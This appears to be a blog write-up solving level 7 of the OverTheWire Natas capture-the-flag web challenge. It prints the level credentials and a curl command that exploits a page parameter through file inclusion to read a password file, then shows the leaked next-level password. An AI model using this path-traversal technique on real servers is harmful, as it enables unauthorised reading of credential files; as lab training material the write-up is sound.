---
date: '2026-02-15'
description: home, about, /etc...
draft: false
title: natas-7
weight: 8
ShowToc: false
---

| info | value                                      |
|:-----|-------------------------------------------:|
| user | `natas7`                                   |
| pass | `bmg8SvU1LizuWjx3y7xkNERkHxGre0GS`         |
| host | `http://natas7.natas.labs.overthewire.org` |

## explanation

upon entering the creds we can find two links plus a comment

```html
<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
```

considering those links index pages that are being served for the user from a server, we likely can also attempt directory traversal within the php environment query

```sh
curl http://natas7.natas.labs.overthewire.org/index.php\?page\=/etc/natas_webpass/natas8 \
-u natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
```

the expected output contains the password for natas8

```html
<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
```
